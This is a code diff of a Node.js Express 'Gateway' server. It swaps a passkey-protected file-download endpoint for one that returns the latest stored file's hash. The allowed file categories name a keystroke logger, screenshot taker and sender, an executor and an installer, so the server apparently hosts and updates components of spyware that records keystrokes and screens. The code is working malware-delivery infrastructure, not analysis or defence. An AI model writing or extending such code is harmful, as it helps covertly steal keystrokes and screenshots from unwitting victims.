@@ -1169,51 +1169,38 @@ app.post('/remove/:category', async (req, res) => {
   res.redirect('/updater');
 });
 
-// New download endpoint
-app.get('/download/:category/:uploadedBy', async (req, res) => {
-  const { category, uploadedBy } = req.params;
+// Updated hash endpoint
+app.get('/hash/:category', async (req, res) => {
+  const { category } = req.params;
   const { passkey } = req.query;
 
   // Validate passkey
   if (passkey !== process.env.DOWNLOAD_PASSKEY) {
-    console.log(`Invalid passkey attempt for category: ${category}, uploadedBy: ${uploadedBy}`);
+    console.log(`Invalid passkey attempt for hash request: category: ${category}`);
     return res.status(403).send('Forbidden');
   }
 
   // Validate category
   if (!['keyStrokerExe', 'mainExecutableExe', 'snapTakerExe', 'snapSenderExe', 'xenoExecutorZip', 'installerExe'].includes(category)) {
-    console.log(`Invalid category download attempt: ${category}`);
+    console.log(`Invalid category for hash request: ${category}`);
     return res.status(400).send('Invalid category');
   }
 
   try {
-    // Find file metadata
-    const fileMetadata = await FileMetadata.findOne({ category, uploadedBy });
+    const fileMetadata = await FileMetadata.findOne({ category })
+      .sort({ uploadDate: -1 }); // Sort by uploadDate descending
     if (!fileMetadata) {
-      console.log(`File not found for category: ${category}, uploadedBy: ${uploadedBy}`);
+      console.log(`File not found for hash request: category: ${category}`);
       return res.status(404).send('File not found');
     }
 
-    // Stream file from GridFS
-    const downloadStream = bucket.openDownloadStream(fileMetadata.fileId);
-    res.setHeader('Content-Type', 'application/octet-stream');
-    res.setHeader('Content-Disposition', `attachment; filename="${fileMetadata.filename}"`);
-    // Add the file hash to the response headers
-    res.setHeader('X-File-Hash', fileMetadata.hash);
-
-    downloadStream.on('error', (err) => {
-      console.error(`Error streaming file ${fileMetadata.fileId}:`, err);
-      if (!res.headersSent) {
-        res.status(500).send('Error streaming file');
-      }
-    });
-
-    downloadStream.pipe(res);
+    res.status(200).send(fileMetadata.hash);
   } catch (err) {
-    console.error(`Error in download endpoint for category: ${category}, uploadedBy: ${uploadedBy}`, err);
+    console.error(`Error in hash endpoint for category: ${category}`, err);
     res.status(500).send('Server error');
   }
 });
+
 // Server Start
 app.listen(port, () => {
   console.log(`🚀 Gateway running at http://localhost:${port}`);
